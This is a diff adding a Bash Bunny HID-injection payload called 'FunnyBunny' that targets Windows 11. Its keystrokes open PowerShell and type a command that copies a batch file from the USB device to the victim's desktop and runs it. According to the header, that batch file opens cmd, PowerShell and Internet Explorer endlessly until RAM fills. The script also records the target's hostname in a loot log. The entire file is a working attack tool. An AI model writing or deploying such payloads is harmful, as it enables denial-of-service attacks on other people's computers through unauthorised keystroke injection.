@@ -1,0 +1,98 @@
+#!/bin/bash
+#
+# Title: 	    FunnyBunny
+# Author: 	    Sven Herz
+# Version: 	    1.1.1
+# Target:	    Windows 11
+# Description:	Saves a file to the desktop and runs it. The file opens cmd, powershell and iexplorer in an endless loop, so that the RAM fills up.
+# Attackmode:	HID; STORAGE
+
+
+
+
+# Initialization
+#
+LED SETUP
+ATTACKMODE HID STORAGE
+mount /dev/nandf /root/udisk/
+
+ORIGINAL_SWITCH=$SWITCH_POSITION
+PAYLOAD_DIR=/root/udisk/payloads/$SWITCH_POSITION
+LOOTBASE=/root/udisk/loot/FunnyBunny/
+
+GET TARGET_HOSTNAME
+
+COUNT=$(ls -lad $LOOTBASE/$TARGET_HOSTNAME* | wc -l)
+COUNT=$((COUNT+1))
+LOOTDIR=$LOOTBASE/$TARGET_HOSTNAME-$COUNT
+mkdir -p $LOOTDIR
+
+
+
+
+# Environment informations:
+#
+echo -e "\n\n" >> $LOOTDIR/FBLog.txt
+echo "---------------------------------------- Infos ----------------------------------------" >> $LOOTDIR/FBLog.txt
+echo -e "\n" >> $LOOTDIR/FBLog.txt
+
+echo "PAYLOAD_DIR: $PAYLOAD_DIR" >> $LOOTDIR/FBLog.txt
+echo "LOOTDIR: $LOOTDIR" >> $LOOTDIR/FBLog.txt
+echo "TARGET_HOSTNAME: $TARGET_HOSTNAME" >> $LOOTDIR/FBLog.txt
+
+
+
+
+# Synchronize file system
+#
+SYNC ()
+{
+    echo "Start SYNC..." >> $LOOTDIR/FBLog.txt
+    sync; sleep 1; sync
+    echo "Finished SYNC!" >> $LOOTDIR/FBLog.txt
+}
+
+
+
+
+EXECUTE() {
+    LED ATTACK
+
+    echo "Start EXECUTE()" >> $LOOTDIR/FBLog.txt
+
+    echo "Start powershell..." >> $LOOTDIR/FBLog.txt
+    RUN WIN powershell
+    QUACK ENTER
+    QUACK DELAY 200
+    echo -e "Powershell started successfully!" >> $LOOTDIR/FBLog.txt
+    
+    echo "Start copy and execute Vault_2024.ipj.bat" >> $LOOTDIR/FBLog.txt
+    QUACK STRING "Copy-Item -Path ((Get-WmiObject Win32_Volume -Filter \"Label='BASHBUNNY'\").Name + '\payloads\\$SWITCH_POSITION\Vault_2024.ipj.bat') -Destination \$env:USERPROFILE\\Desktop; & \$env:USERPROFILE\\Desktop\\Vault_2024.ipj.bat"
+    QUACK ENTER
+    echo "Congratulations, copying and running Vault 2024.ipj.bat was successful!" >> $LOOTDIR/FBLog.txt
+
+    SYNC
+}
+
+
+
+
+echo -e "\n\n" >> $LOOTDIR/FBLog.txt
+echo "---------------------------------------- Logs ----------------------------------------" >> $LOOTDIR/FBLog.txt
+echo -e "\n" >> $LOOTDIR/FBLog.txt
+echo "Start programm..." >> $LOOTDIR/FBLog.txt
+
+
+
+
+while true
+do
+    #~~~~   Start attack   ~~~~
+    EXECUTE
+
+    #~~~~   Clean up   ~~~~
+    echo "Finish, payload is now terminated!" >> $LOOTDIR/FBLog.txt
+	SYNC
+    LED FINISH
+	exit 1
+done
